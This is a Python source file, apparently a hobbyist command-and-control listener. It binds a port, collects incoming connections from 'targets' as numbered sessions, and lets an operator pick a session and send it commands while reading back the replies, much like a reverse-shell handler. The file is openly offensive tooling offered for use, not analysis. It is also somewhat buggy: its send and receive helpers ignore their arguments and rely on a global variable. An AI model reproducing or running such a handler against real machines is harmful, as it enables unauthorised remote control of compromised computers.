import socket
import sys
import threading


def banner():
    print('███████  █████  ███    ██  ██████ ██████  ')
    print('██      ██   ██ ████   ██ ██           ██ ')
    print('███████ ███████ ██ ██  ██ ██       █████  ')
    print('     ██ ██   ██ ██  ██ ██ ██      ██      ')
    print('███████ ██   ██ ██   ████  ██████ ███████  by Sanchious')


def inbound_message(remote_target):
    print(f'[+] Awaiting response...')
    response = session_id.recv(1024).decode()
    return response


def outbound_message(remote_target, message):
    session_id.send(message.encode())


def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print(
        f'[*] Listening on port {host_port}...\n[*] Awaiting connection from clinet...')
    sock.listen()
    t1 = threading.Thread(target=message_handler)
    t1.start()


def message_handler():
    while True:
        try:
            remote_target, remote_ip = sock.accept()
            sessions.append([remote_target, remote_ip[0]])
            print(
                f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
        except:
            pass


def session_handler(session_id):
    while True:
        message = input('send message#> ')
        if message == 'exit':
            outbound_message(session_id, message)
            session_id.close()
            break
        elif message == 'background':
            break
        outbound_message(session_id, message)

        response = inbound_message(session_id)
        if response == 'exit':
            print('[-] The client has terminated the session.')
            session_id.close()
            break
        print(response)


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    banner()
    sessions = []
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])

    except IndexError:
        print('[-] Argument(s) missing.')
    except Exception as e:
        print(e)

    listener_handler()
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(' ')[0] == 'sessions':
                session_counter = 0
                if command.split(' ')[1] == '-l':
                    print('Session' + ' ' * 10 + 'Targets')
                    for target in sessions:
                        print(str(session_counter) + ' ' *
                              16 + str(target[1]))
                        session_counter += 1
                if command.split(' ')[1] == '-i':
                    num = int(command.split(' ')[2])
                    session_id = (sessions[num])[0]
                    session_handler(session_id)
        except KeyboardInterrupt:
            print('\n [-] Keyboard interrupt issued.')
            sock.close()
            break
